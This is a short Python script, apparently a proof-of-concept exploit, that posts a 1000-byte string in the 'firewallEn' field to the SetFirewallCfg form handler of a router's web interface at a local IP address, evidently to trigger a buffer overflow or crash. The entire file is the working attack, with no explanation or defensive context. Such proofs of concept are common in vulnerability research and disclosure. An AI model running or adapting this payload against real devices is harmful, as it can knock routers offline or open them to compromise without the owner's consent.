import requests
ip = "192.168.10.1"
url = "http://" + ip + "/goform/SetFirewallCfg"
payload = b"a"*1000
data = {"firewallEn": payload}
response = requests.post(url, data=data)
response = requests.post(url, data=data)
print(response.text)